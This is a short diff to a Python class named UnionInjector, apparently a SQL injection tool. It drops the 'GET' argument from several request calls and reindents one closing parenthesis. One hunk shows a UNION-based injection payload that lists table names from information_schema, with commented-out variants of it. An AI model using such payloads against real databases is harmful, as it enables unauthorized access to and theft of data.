@@ -28,7 +28,6 @@ class UnionInjector:
 
 			response = self.requester.send(
 				url,
-				"GET",
 				{param: payload}
 			)
 
@@ -51,7 +50,6 @@ class UnionInjector:
 
 		response = self.requester.send(
 			url,
-			"GET",
 			{param: payload}
 		)
 
@@ -66,11 +64,10 @@ class UnionInjector:
 			"-1 UNION SELECT table_name FROM information_schema.tables"
 			#"' UNION SELECT table_name "
 			#"FROM information_schema.tables -- "
-		)
+	)
 
 		response = self.requester.send(
 			url,
-			"GET",
 			{param: payload}
 		)
 
@@ -86,7 +83,6 @@ class UnionInjector:
 
 		response = self.requester.send(
 			url,
-			"GET",
 			{param: payload}
 		)
 
@@ -101,7 +97,6 @@ class UnionInjector:
 
 		response = self.requester.send(
 			url,
-			"GET",
 			{param: payload}
 		)
 
